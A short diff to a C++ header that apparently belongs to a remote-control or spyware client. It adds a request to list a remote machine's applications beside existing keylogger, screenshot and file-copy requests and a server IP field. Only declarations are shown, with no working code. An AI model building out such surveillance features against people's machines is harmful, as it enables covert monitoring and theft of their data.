@@ -20,6 +20,7 @@ public:
     bool sendKeyloggerOffRequest();
     bool sendScreenshotRequest();
     bool sendFileCopyRequest(const std::string& sourceFileName, const std::string& destinationFileName);
+    bool sendListOfAppRequest();
 
 private:
     std::string serverIP;
